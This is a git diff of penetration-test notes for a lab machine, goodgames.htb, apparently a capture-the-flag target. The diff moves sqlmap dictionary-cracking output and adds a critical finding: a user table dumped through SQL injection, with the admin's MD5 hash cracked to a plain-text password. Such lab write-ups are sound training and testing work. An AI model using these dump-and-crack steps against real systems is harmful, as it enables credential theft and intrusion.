@@ -26,30 +26,8 @@ _current DB user is DBA_: False
 - page performs a GET request to non-scoped server - "nkdev.us11.list-manage.com"
 
 ### Cracking
-[ ] Attempt to crack obtained hases from SQLi
+[x] Attempt to crack obtained hases from SQLi
 - initial attempt with rockyou.txt; no clear-text passwords found.
-```
-[12:57:00] [INFO] using hash method 'md5_generic_passwd'
-what dictionary do you want to use?
-[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
-[2] custom dictionary file
-[3] file with list of dictionary files
-> /usr/share/wordlists/rockyou.txt
-[12:58:01] [INFO] using default dictionary
-do you want to use common password suffixes? (slow!) [y/N] N
-[12:58:05] [INFO] starting dictionary-based cracking (md5_generic_passwd)
-[12:58:05] [WARNING] multiprocessing hash cracking is currently not supported on this platform
-[12:58:40] [WARNING] no clear password(s) found                                                                                                                                     
-Database: main
-Table: user
-[2 entries]
-+----+----------+---------------------+----------------------------------+
-| id | name     | email               | password                         |
-+----+----------+---------------------+----------------------------------+
-| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
-| 2  | Register | register@form.com   | 2c103f2c4ed1e59c0b4e2e01821770fa |
-+----+----------+---------------------+----------------------------------+
-```
 
 ## Findings
 ### CRITICAL
@@ -68,6 +46,17 @@ Parameter: #1* ((custom) POST)
 ---
 [12:35:25] [INFO] the back-end DBMS is MySQL
 back-end DBMS: MySQL >= 5.0.12
+```
+### CRITICAL
+Password Hygiene - http://goodgames.htb/ - easily cracked password
+```
+Database: main
+Table: user
++----+----------+---------------------+----------------------------------+--------------------+
+| id | name     | email               | password                         | password           |
++----+----------+---------------------+----------------------------------+--------------------+
+| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
++----+----------+---------------------+----------------------------------+--------------------+
 ```
 
 ## Enumeration
@@ -854,6 +843,7 @@ PS D:\hashcat-6.2.6>
 ```
 
 **Cracked Hashes**
+Important - the 'Register' user was created when performing tests and is not initial DB account
 ```
 Database: main
 Table: user
